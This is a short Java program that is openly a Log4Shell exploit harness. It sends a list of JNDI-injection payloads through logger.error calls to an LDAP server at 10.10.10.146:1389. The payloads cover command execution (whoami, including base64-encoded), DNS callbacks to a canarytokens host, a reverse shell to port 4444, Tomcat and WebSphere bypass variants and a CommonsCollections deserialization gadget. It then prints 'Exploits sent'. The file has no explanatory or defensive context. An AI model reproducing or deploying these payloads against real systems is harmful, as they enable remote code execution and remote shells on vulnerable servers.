import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import java.lang.Thread;


public class log4j {
    private static final Logger logger = LogManager.getLogger(log4j.class);

    public static void main(String[] args) {
	            System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        logger.error("${jndi:ldap://10.10.10.146:1389/Basic/Command/whoami}");
        logger.error("${jndi:ldap://10.10.10.146:1389/Basic/Dnslog/rd6qzctw3uqr1m5ojo8djjspd.canarytokens.com}");
        logger.error("${jndi:ldap://10.10.10.146:1389/Basic/Command/Base64/d2hvYW1pCg==}");
        logger.error("${jndi:ldap://10.10.10.146:1389/Basic/ReverseShell/10.10.10.146/4444}");
        logger.error("${jndi:ldap://10.10.10.146:1389/Basic/TomcatEcho}");
        logger.error("${jndi:ldap://10.10.10.146:1389/Deserialization/CommonsCollectionsK1/Dnslog/rd6qzctw3uqr1m5ojo8djjspd.canarytokens.com}");
        logger.error("${jndi:ldap://10.10.10.146:1389/TomcatBypass/Dnslog/rd6qzctw3uqr1m5ojo8djjspd.canarytokens.com}");
        logger.error("${jndi:ldap://10.10.10.146:1389/WebsphereBypass/Upload/Dnslog/rd6qzctw3uqr1m5ojo8djjspd.canarytokens.com}");
        logger.error("${jndi:ldap://10.10.10.146:1389/TomcatBypass/Dnslog/rd6qzctw3uqr1m5ojo8djjspd.canarytokens.com}");
	try {
		System.out.println("Exploits sent, sleeping for 10 minutes");
		Thread.sleep(1000 * 60 * 10);
	} catch(InterruptedException e) {
		e.printStackTrace();
	}

    }
}
